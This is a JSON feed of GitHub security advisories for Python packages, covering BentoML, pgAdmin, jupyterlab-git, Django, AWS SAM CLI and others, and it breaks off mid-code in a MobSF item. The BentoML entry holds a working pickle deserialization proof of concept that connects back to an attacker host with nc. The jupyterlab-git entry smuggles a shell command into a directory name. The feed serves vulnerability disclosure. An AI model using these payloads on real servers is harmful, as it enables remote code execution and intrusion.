{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Remote Code Execution (RCE) vulnerability caused by insecure deserialization has been identified in the latest version(v1.4.2) of BentoML. It allows any unauthenticated user to execute arbitrary code on the server.</p>\n<h3 id=\"details\">Details</h3>\n<p>It exists an unsafe code segment in <code>serde.py</code>: </p>\n<pre><code class=\"language-Python\">def deserialize_value(self, payload: Payload) -&gt; t.Any:\n    if \"buffer-lengths\" not in payload.metadata:\n        return pickle.loads(b\"\".join(payload.data))\n</code></pre>\n<p>Through data flow analysis, it is confirmed that the <code>payload </code>content is sourced from an HTTP request, which can be fully manipulated by the attack. Due to the lack of validation in the code, maliciously crafted serialized data can execute harmful actions during deserialization.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Environment:</p>\n<ul>\n<li>Server host:<ul>\n<li>IP: 10.98.36.123</li>\n<li>OS: Ubuntu</li>\n</ul>\n</li>\n<li>Attack host:<ul>\n<li>IP: 10.98.36.121</li>\n<li>OS: Ubuntu</li>\n</ul>\n</li>\n</ul>\n<ol>\n<li>Follow the instructions on the BentoML official README(<a href=\"https://github.com/bentoml/BentoML\">https://github.com/bentoml/BentoML</a>) to set up the environment.</li>\n</ol>\n<p>1.1 Install BentoML (Server host: 10.98.36.123) :\n<code> pip install -U bentoml</code></p>\n<p>1.2 Define APIs in a <code>service.py</code> file (Server host: 10.98.36.123) :</p>\n<pre><code class=\"language-Python\">from __future__ import annotations\n\nimport bentoml\n\n@bentoml.service(\n    resources={\"cpu\": \"4\"}\n)\nclass Summarization:\n    def __init__(self) -&gt; None:\n        import torch\n        from transformers import pipeline\n\n        device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n        self.pipeline = pipeline('summarization', device=device)\n\n    @bentoml.api(batchable=True)\n    def summarize(self, texts: list[str]) -&gt; list[str]:\n        results = self.pipeline(texts)\n        return [item['summary_text'] for item in results]\n</code></pre>\n<p>1.3 Run the service code (Server host: 10.98.36.123) :</p>\n<pre><code class=\"language-Bash\">pip install torch transformers  # additional dependencies for local run\n\nbentoml serve\n</code></pre>\n<ol start=\"2\">\n<li><p>Start nc listening on the attacking host (Attack host: 10.98.36.121) :\n<code>nc -lvvp 1234</code></p>\n</li>\n<li><p>Send maliciously crafted request (Attack host: 10.98.36.121) :</p>\n</li>\n</ol>\n<pre><code class=\"language-Python\">import pickle\nimport os\nimport requests\n\nheaders = {'Content-Type': 'application/vnd.bentoml+pickle'}\n\nclass Evil:\n    def __reduce__(self):\n        return(os.system, ('nc 10.98.36.121 1234',))\n\npayload = pickle.dumps(Evil())\n\nrequests.post(\"http://10.98.36.123:3000/summarize\", data=payload, headers=headers)\n</code></pre>\n<ol start=\"4\">\n<li>Attack success (Attack host: 10.98.36.121) :\nThe server host(10.98.36.123) has connected to the attacker's host(10.98.36.121) listening on port 1234.\n<img alt=\"nc\" src=\"https://github.com/user-attachments/assets/858cba4a-6880-498f-b922-dd9a2dc78a85\"></li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>Remote Code Execution (RCE).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bentoml/BentoML/security/advisories/GHSA-33xw-247w-6hmc\">https://github.com/bentoml/BentoML/security/advisories/GHSA-33xw-247w-6hmc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27520\">https://nvd.nist.gov/vuln/detail/CVE-2025-27520</a></li>\n<li><a href=\"https://github.com/bentoml/BentoML/commit/b35f4f4fcc53a8c3fe8ed9c18a013fe0a728e194\">https://github.com/bentoml/BentoML/commit/b35f4f4fcc53a8c3fe8ed9c18a013fe0a728e194</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-33xw-247w-6hmc\">https://github.com/advisories/GHSA-33xw-247w-6hmc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-33xw-247w-6hmc",
            "title": "[bentoml] BentoML Allows Remote Code Execution (RCE) via Insecure Deserialization",
            "date_modified": "2025-04-04T16:05:34.000Z",
            "date_published": "2025-04-04T16:05:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-33xw-247w-6hmc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in InternLM LMDeploy up to 0.7.1. It has been classified as critical. Affected is the function load_weight_ckpt of the file lmdeploy/lmdeploy/vl/model/utils.py of the component PT File Handler. The manipulation leads to deserialization. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3162\">https://nvd.nist.gov/vuln/detail/CVE-2025-3162</a></li>\n<li><a href=\"https://github.com/InternLM/lmdeploy/issues/3255\">https://github.com/InternLM/lmdeploy/issues/3255</a></li>\n<li><a href=\"https://github.com/InternLM/lmdeploy/issues/3255#issue-2918985270\">https://github.com/InternLM/lmdeploy/issues/3255#issue-2918985270</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.303108\">https://vuldb.com/?ctiid.303108</a></li>\n<li><a href=\"https://vuldb.com/?id.303108\">https://vuldb.com/?id.303108</a></li>\n<li><a href=\"https://vuldb.com/?submit.542520\">https://vuldb.com/?submit.542520</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7vc5-mjwp-c8fq\">https://github.com/advisories/GHSA-7vc5-mjwp-c8fq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7vc5-mjwp-c8fq",
            "title": "[lmdeploy] LMDeploy Improper Input Validation Vulnerability",
            "date_modified": "2025-04-04T14:26:02.000Z",
            "date_published": "2025-04-03T15:31:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7vc5-mjwp-c8fq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>pgAdmin &lt;= 9.1 is affected by a security vulnerability with Cross-Site Scripting(XSS). If attackers&nbsp;execute any arbitrary HTML/JavaScript in a user's browser through query result rendering, then HTML/JavaScript runs on the browser.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2946\">https://nvd.nist.gov/vuln/detail/CVE-2025-2946</a></li>\n<li><a href=\"https://github.com/pgadmin-org/pgadmin4/issues/8602\">https://github.com/pgadmin-org/pgadmin4/issues/8602</a></li>\n<li><a href=\"https://github.com/pgadmin-org/pgadmin4/commit/1305d9910beefd0d6b4c7eb4f111f86edb1d356b\">https://github.com/pgadmin-org/pgadmin4/commit/1305d9910beefd0d6b4c7eb4f111f86edb1d356b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2rrx-pphc-qfv9\">https://github.com/advisories/GHSA-2rrx-pphc-qfv9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2rrx-pphc-qfv9",
            "title": "[pgadmin4] pgAdmin 4 Vulnerable to Cross-Site Scripting (XSS) via Query Result Rendering",
            "date_modified": "2025-04-04T14:23:57.000Z",
            "date_published": "2025-04-03T15:31:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2rrx-pphc-qfv9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Remote Code Execution security vulnerability in pgAdmin 4  (Query Tool and Cloud Deployment modules).</p>\n<p>The vulnerability is associated with the 2 POST endpoints;&nbsp;/sqleditor/query_tool/download, where the query_commited parameter and&nbsp;/cloud/deploy endpoint, where the high_availability parameter is&nbsp;unsafely passed to the Python eval() function, allowing arbitrary code execution.</p>\n<p>This issue affects pgAdmin 4: before 9.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2945\">https://nvd.nist.gov/vuln/detail/CVE-2025-2945</a></li>\n<li><a href=\"https://github.com/pgadmin-org/pgadmin4/issues/8603\">https://github.com/pgadmin-org/pgadmin4/issues/8603</a></li>\n<li><a href=\"https://github.com/pgadmin-org/pgadmin4/commit/75be0bc22d3d8d7620711835db817bd7c021007c\">https://github.com/pgadmin-org/pgadmin4/commit/75be0bc22d3d8d7620711835db817bd7c021007c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g73c-fw68-pwx3\">https://github.com/advisories/GHSA-g73c-fw68-pwx3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g73c-fw68-pwx3",
            "title": "[pgadmin4] pgAdmin 4 Vulnerable to Remote Code Execution",
            "date_modified": "2025-04-04T14:23:33.000Z",
            "date_published": "2025-04-03T15:31:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g73c-fw68-pwx3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"overview\">Overview</h2>\n<p>On many platforms, a third party can create a Git repository under a name that includes a shell command substitution <a href=\"https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html\">^1</a> string in the syntax <code>$(&lt;command&gt;)</code>. These directory names are allowed in macOS and a majority of Linux distributions <a href=\"https://www.gnu.org/software/libc/manual/html_node/File-Name-Portability.html\">^2</a>. If a user starts <code>jupyter-lab</code> in a parent directory of this inappropriately-named Git repository, opens it, and clicks \"Git &gt; Open Git Repository in Terminal\" from the menu bar, then the injected command <code>&lt;command&gt;</code> is run in the user's shell without the user's permission.</p>\n<p>This issue is occurring because when that menu entry is clicked, <code>jupyterlab-git</code> opens the terminal and runs <code>cd &lt;git-repo-path&gt;</code> through the shell to set the current directory <a href=\"https://github.com/jupyterlab/jupyterlab-git/blob/7eb3b06f0092223bd5494688ec264527bbeb2195/src/commandsAndMenu.tsx#L175-L184\">^3</a>. Doing so runs any command substitution strings present in the directory name, which leads to the command injection issue described here. A previous patch provided an incomplete fix <a href=\"https://github.com/jupyterlab/jupyterlab-git/pull/1196\">^4</a>.</p>\n<h2 id=\"scope-of-impact\">Scope of Impact</h2>\n<p>This issue allows for arbitrary code execution via command injection. A wide range of actions are permitted by this issue, including but not limited to: modifying files, exfiltrating data, halting services, or compromising the server's security rules.</p>\n<p>We have scanned the source code of <code>jupyterlab-git</code> for other command injection risks, and have not found any at the time of writing.</p>\n<p>This issue was reproduced on the latest release of <code>jupyterlab-git</code>, v0.51.0. The steps taken to reproduce this issue are described in the \"Proof-of-concept\" section below.</p>\n<h2 id=\"proof-of-concept\">Proof-of-concept</h2>\n<ol>\n<li><p>Create a new directory via <code>mkdir test/ &amp;&amp; cd test/</code>.</p>\n</li>\n<li><p>Create a new Git repository under <code>test/</code> with a command substitution string in the directory name by running these commands:</p>\n</li>\n</ol>\n<pre><code>mkdir '$(touch pwned.txt)'\ncd '$(touch pwned.txt)/'\ngit init\ncd ..\n</code></pre>\n<ol start=\"3\">\n<li>Start JupyterLab from <code>test/</code> by running jupyter lab.</li>\n<li>With JupyterLab open in the browser, double click on <code>$(touch pwned.txt)</code> in the file browser.</li>\n<li>From the top menu bar, click \"Git &gt; Open Git Repository in Terminal\".</li>\n<li>Verify that <code>pwned.txt</code> is created under <code>test/</code>. This demonstrates the command injection issue described here.</li>\n</ol>\n<h2 id=\"proof-of-concept-mitigation\">Proof-of-concept mitigation</h2>\n<p>The issue can be mitigated by the patch shown below.</p>\n<details><summary>Patch (click to expand)</summary>\n\n<pre><code class=\"language-diff\">diff --git a/src/commandsAndMenu.tsx b/src/commandsAndMenu.tsx\nindex 3779a6c..71ddcea 100644\n--- a/src/commandsAndMenu.tsx\n+++ b/src/commandsAndMenu.tsx\n@@ -164,31 +164,13 @@ export function addCommands(\n     label: trans.__('Open Git Repository in Terminal'),\n     caption: trans.__('Open a New Terminal to the Git Repository'),\n     execute: async args =&gt; {\n-      const main = (await commands.execute(\n-        'terminal:create-new',\n-        args\n-      )) as MainAreaWidget&lt;ITerminal.ITerminal&gt;;\n+      const cwd = gitModel.pathRepository;\n+      const main = (await commands.execute('terminal:create-new', {\n+        ...args,\n+        cwd\n+      })) as MainAreaWidget&lt;ITerminal.ITerminal&gt;;\n \n-      try {\n-        if (gitModel.pathRepository !== null) {\n-          const terminal = main.content;\n-          terminal.session.send({\n-            type: 'stdin',\n-            content: [\n-              `cd \"${gitModel.pathRepository\n-                .split('\"')\n-                .join('\\\\\"')\n-                .split('`')\n-                .join('\\\\`')}\"\\n`\n-            ]\n-          });\n-        }\n-\n-        return main;\n-      } catch (e) {\n-        console.error(e);\n-        main.dispose();\n-      }\n+      return main;\n</code></pre>\n</details>\n\n<p>This patch removes the <code>cd &lt;git-repo-path&gt;</code> shell command that causes the issue. To preserve the existing behavior, the <code>cwd</code> argument is set to <code>&lt;git-repo-path&gt;</code> when a terminal session is created via the <code>terminal:create-new</code> JupyterLab command. This preserves the existing application behavior while mitigating the command injection issue.</p>\n<p>We have verified that this patch works when applied to a local installation of <code>jupyterlab-git</code>. We have also verified that the <code>cwd</code> argument is available in all versions of JupyterLab 4, so this patch should be fully backwards-compatible.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>We recommend that users upgrade to the patched versions listed on this GHSA. However, if a user is unable to upgrade, there are 3 different ways to mitigate this vulnerability without upgrading to a patch. </p>\n<ol>\n<li><p>Disable terminals on <code>jupyter-server</code> level:</p>\n<pre><code>c.ServerApp.terminals_enabled =  False\n</code></pre>\n</li>\n<li><p>Disable the terminals server extension:</p>\n<pre><code>jupyter server extension disable jupyter_server_terminals\n</code></pre>\n</li>\n<li><p>Disable the lab extension:</p>\n<pre><code>jupyter labextension disable @jupyterlab/terminal-extension\n</code></pre>\n</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-cj5w-8mjf-r5f8\">https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-cj5w-8mjf-r5f8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30370\">https://nvd.nist.gov/vuln/detail/CVE-2025-30370</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab-git/pull/1196\">https://github.com/jupyterlab/jupyterlab-git/pull/1196</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab-git/commit/b46482993f76d3a546015c6a94ebed8b77fc2376\">https://github.com/jupyterlab/jupyterlab-git/commit/b46482993f76d3a546015c6a94ebed8b77fc2376</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab-git/blob/7eb3b06f0092223bd5494688ec264527bbeb2195/src/commandsAndMenu.tsx#L175-L184\">https://github.com/jupyterlab/jupyterlab-git/blob/7eb3b06f0092223bd5494688ec264527bbeb2195/src/commandsAndMenu.tsx#L175-L184</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cj5w-8mjf-r5f8\">https://github.com/advisories/GHSA-cj5w-8mjf-r5f8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cj5w-8mjf-r5f8",
            "title": "[jupyterlab-git] jupyterlab-git has a command injection vulnerability in \"Open Git Repository in Terminal\"",
            "date_modified": "2025-04-04T14:05:45.000Z",
            "date_published": "2025-04-04T14:05:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cj5w-8mjf-r5f8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in the FinanceChatLlamaPack of the llama-index-packs-finchat package, versions up to v0.3.0, allows for SQL injection in the <code>run_sql_query</code> function of the <code>database_agent</code>. This vulnerability can be exploited by an attacker to inject arbitrary SQL queries, leading to remote code execution (RCE) through the use of PostgreSQL's large object functionality.</p>\n<p>The issue is resolved by no longer officially supporting the package and moving it into the <code>stale_packages</code> branch on the repo, this removing it from documentation etc.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-12909\">https://nvd.nist.gov/vuln/detail/CVE-2024-12909</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/commit/5d03c175476452db9b8abcdb7d5767dd7b310a75\">https://github.com/run-llama/llama_index/commit/5d03c175476452db9b8abcdb7d5767dd7b310a75</a></li>\n<li><a href=\"https://huntr.com/bounties/44e8177f-200a-4ba3-a12c-8bc21e313a3f\">https://huntr.com/bounties/44e8177f-200a-4ba3-a12c-8bc21e313a3f</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/tree/stale_packages/llama-index-packs/llama-index-packs-finchat\">https://github.com/run-llama/llama_index/tree/stale_packages/llama-index-packs/llama-index-packs-finchat</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x48g-hm9c-ww42\">https://github.com/advisories/GHSA-x48g-hm9c-ww42</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x48g-hm9c-ww42",
            "title": "[llama-index-packs-finchat] llama-index-packs-finchat SQL Injection vulnerability",
            "date_modified": "2025-04-03T13:11:42.000Z",
            "date_published": "2025-03-20T12:32:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x48g-hm9c-ww42"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.1 before 5.1.8 and 5.0 before 5.0.14. The NFKC normalization is slow on Windows. As a consequence, django.contrib.auth.views.LoginView, django.contrib.auth.views.LogoutView, and django.views.i18n.set_language are subject to a potential denial-of-service attack via certain inputs with a very large number of Unicode characters.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27556\">https://nvd.nist.gov/vuln/detail/CVE-2025-27556</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/g/django-announce\">https://groups.google.com/g/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2025/apr/02/security-releases\">https://www.djangoproject.com/weblog/2025/apr/02/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/2cb311f7b069723027fb5def4044d1816d7d2afd\">https://github.com/django/django/commit/2cb311f7b069723027fb5def4044d1816d7d2afd</a></li>\n<li><a href=\"https://github.com/django/django/commit/39e2297210d9d2938c75fc911d45f0e863dc4821\">https://github.com/django/django/commit/39e2297210d9d2938c75fc911d45f0e863dc4821</a></li>\n<li><a href=\"https://github.com/django/django/commit/8c6871b097b6c49d2a782c0d80d908bcbe2116f1\">https://github.com/django/django/commit/8c6871b097b6c49d2a782c0d80d908bcbe2116f1</a></li>\n<li><a href=\"https://github.com/django/django/commit/edc2716d01a6fdd84b173c02031695231bcee1f8\">https://github.com/django/django/commit/edc2716d01a6fdd84b173c02031695231bcee1f8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/04/02/2\">http://www.openwall.com/lists/oss-security/2025/04/02/2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wqfg-m96j-85vm\">https://github.com/advisories/GHSA-wqfg-m96j-85vm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wqfg-m96j-85vm",
            "title": "[Django] Django Potential Denial of Service (DoS) on Windows ",
            "date_modified": "2025-04-03T13:26:17.000Z",
            "date_published": "2025-04-02T15:31:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wqfg-m96j-85vm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.1 before 5.1.8 and 5.0 before 5.0.14. The NFKC normalization is slow on Windows. As a consequence, django.contrib.auth.views.LoginView, django.contrib.auth.views.LogoutView, and django.views.i18n.set_language are subject to a potential denial-of-service attack via certain inputs with a very large number of Unicode characters.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27556\">https://nvd.nist.gov/vuln/detail/CVE-2025-27556</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/g/django-announce\">https://groups.google.com/g/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2025/apr/02/security-releases\">https://www.djangoproject.com/weblog/2025/apr/02/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/2cb311f7b069723027fb5def4044d1816d7d2afd\">https://github.com/django/django/commit/2cb311f7b069723027fb5def4044d1816d7d2afd</a></li>\n<li><a href=\"https://github.com/django/django/commit/39e2297210d9d2938c75fc911d45f0e863dc4821\">https://github.com/django/django/commit/39e2297210d9d2938c75fc911d45f0e863dc4821</a></li>\n<li><a href=\"https://github.com/django/django/commit/8c6871b097b6c49d2a782c0d80d908bcbe2116f1\">https://github.com/django/django/commit/8c6871b097b6c49d2a782c0d80d908bcbe2116f1</a></li>\n<li><a href=\"https://github.com/django/django/commit/edc2716d01a6fdd84b173c02031695231bcee1f8\">https://github.com/django/django/commit/edc2716d01a6fdd84b173c02031695231bcee1f8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/04/02/2\">http://www.openwall.com/lists/oss-security/2025/04/02/2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wqfg-m96j-85vm\">https://github.com/advisories/GHSA-wqfg-m96j-85vm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wqfg-m96j-85vm",
            "title": "[Django] Django Potential Denial of Service (DoS) on Windows ",
            "date_modified": "2025-04-03T13:26:17.000Z",
            "date_published": "2025-04-02T15:31:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wqfg-m96j-85vm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/using-sam-cli.html\">AWS Serverless Application Model Command Line Interface (AWS SAM CLI)</a> is an open-source CLI tool that helps Lambda developers to build and develop Lambda applications locally on their computers using Docker.</p>\n<p>After completing a build with AWS SAM CLI which include symlinks, the content of those symlinks are copied to the cache of the local workspace as regular&nbsp;files&nbsp;or directories. As a result, a user who does not have access to those symlinks outside of the Docker container would now have access via the local workspace.</p>\n<p>Users should <a href=\"https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/manage-sam-cli-versions.html#manage-sam-cli-versions-upgrade\">upgrade to v1.134.0 or newer</a> and ensure any forked or derivative code is patched to incorporate the new fixes. After upgrading, users must re-build their applications using the <code>sam build --use-container</code> to update the symlinks.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The issue is limited to the local workspace and does not affect AWS services, production environments or cross-account resources. The issue only affects workspaces using the AWS SAM CLI with container builds (--use-container),&nbsp;potentially allowing access to content of linked files in the SAM CLI cache.</p>\n<p><strong>Impacted versions:</strong> &lt;= AWS SAM CLI v1.133.0</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The patches are included in AWS SAM CLI  version to v1.134.0 and newer. Users should upgrade and ensure any forked or derivative code is patched to incorporate the new fixes. After upgrading, users must re-build their applications using the <code>sam build --use-container</code> to update the symlinks</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no recommended work around. Customers are advised to upgrade to version v1.134.0 or the latest version.</p>\n<h3 id=\"references\">References</h3>\n<p>CVE-2025-3048</p>\n<hr>\n<p>If you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">vulnerability reporting page</a> or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>\n<h3 id=\"credit\">Credit</h3>\n<p>We would like to thank <a href=\"https://github.com/kevinbackhouse\">Kevin Backhouse</a> with the GitHub Security Lab for collaborating on this issue through the coordinated vulnerability disclosure process.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/aws-sam-cli/security/advisories/GHSA-pp64-wj43-xqcr\">https://github.com/aws/aws-sam-cli/security/advisories/GHSA-pp64-wj43-xqcr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3048\">https://nvd.nist.gov/vuln/detail/CVE-2025-3048</a></li>\n<li><a href=\"https://github.com/aws/aws-sam-cli/pull/7890\">https://github.com/aws/aws-sam-cli/pull/7890</a></li>\n<li><a href=\"https://aws.amazon.com/security/security-bulletins/AWS-2025-008\">https://aws.amazon.com/security/security-bulletins/AWS-2025-008</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pp64-wj43-xqcr\">https://github.com/advisories/GHSA-pp64-wj43-xqcr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pp64-wj43-xqcr",
            "title": "[aws-sam-cli] AWS SAM CLI Path Traversal allows file copy to local cache",
            "date_modified": "2025-04-02T14:36:58.000Z",
            "date_published": "2025-03-31T22:36:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pp64-wj43-xqcr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/using-sam-cli.html\">AWS Serverless Application Model Command Line Interface (AWS SAM CLI)</a> is an open-source CLI tool that helps Lambda developers to build and develop Lambda applications locally on their computers using Docker.</p>\n<p>When running the AWS SAM CLI build process with Docker and symlinks are included in the build files, the container environment allows a user to access privileged files on the host by leveraging the elevated permissions granted to the tool. A user could leverage the elevated permissions to access restricted files via symlinks and copy them to a more permissive location on the container.</p>\n<p>Users should <a href=\"https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/manage-sam-cli-versions.html#manage-sam-cli-versions-upgrade\">upgrade to v1.133.0</a> or newer and ensure any forked or derivative code is patched to incorporate the new fixes. </p>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue is limited to the local workspace and does not affect AWS services, production environments or cross-account resources. The issue only affects local workspaces using AWS SAM CLI with container builds (--use-container), potentially allowing access to local files outside the build directory through the usage of symlinks. </p>\n<p><strong>Impacted versions:</strong> &lt;= AWS SAM CLI v1.132.0</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has been addressed in version 1.133.0. Users should upgrade and ensure any forked or derivative code is patched to incorporate the new fixes. To retain the previous behavior and allow symlinks to resolve on the host machine, please use the explicit '-<a href=\"https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/sam-cli-command-reference-sam-build.html#ref-sam-cli-build-options-mount-symlinks\">-mount-symlinks</a>' parameter.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no recommended work around. Customers are advised to upgrade to version v1.133.0 or the latest version.</p>\n<h3 id=\"references\">References</h3>\n<p>CVE-2025-3047</p>\n<hr>\n<p>If you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">vulnerability reporting page</a> or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>\n<h3 id=\"credit\">Credit</h3>\n<p>We would like to thank <a href=\"https://github.com/kevinbackhouse\">Kevin Backhouse</a> with the GitHub Security Lab for collaborating on this issue through the coordinated vulnerability disclosure process.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/aws-sam-cli/security/advisories/GHSA-px37-jpqx-97q9\">https://github.com/aws/aws-sam-cli/security/advisories/GHSA-px37-jpqx-97q9</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3047\">https://nvd.nist.gov/vuln/detail/CVE-2025-3047</a></li>\n<li><a href=\"https://github.com/aws/aws-sam-cli/pull/7865\">https://github.com/aws/aws-sam-cli/pull/7865</a></li>\n<li><a href=\"https://aws.amazon.com/security/security-bulletins/AWS-2025-008\">https://aws.amazon.com/security/security-bulletins/AWS-2025-008</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-px37-jpqx-97q9\">https://github.com/advisories/GHSA-px37-jpqx-97q9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-px37-jpqx-97q9",
            "title": "[aws-sam-cli] AWS SAM CLI Path Traversal allows file copy to build container",
            "date_modified": "2025-04-02T14:35:26.000Z",
            "date_published": "2025-03-31T22:36:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-px37-jpqx-97q9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The latest deployed fix for the SSRF vulnerability is through the use of the call <code>valid_host()</code>. The code available at lines <a href=\"https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/ae34f7c055aa64fca58e995b70bc7f19da6ca33a/mobsf/MobSF/utils.py#L907-L957\">/ae34f7c055aa64fca58e995b70bc7f19da6ca33a/mobsf/MobSF/utils.py#L907-L957</a> is vulnerable to SSRF abuse using DNS rebinding technique.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The following proof of concept: </p>\n<pre><code class=\"language-python\">def valid_host(host):\n    \"\"\"Check if host is valid.\"\"\"\n    try:\n        prefixs = ('http://', 'https://')\n        if not host.startswith(prefixs):\n            host = f'http://{host}'\n        parsed = urlparse(host)\n        domain = parsed.netloc\n        path = parsed.path\n        if len(domain) == 0:\n            # No valid domain\n            return False, None\n        if len(path) &gt; 0:\n            # Only host is allowed\n            return False, None\n        if ':' in domain:\n            # IPv6\n            return False, None\n        # Local network\n        invalid_prefix = (\n            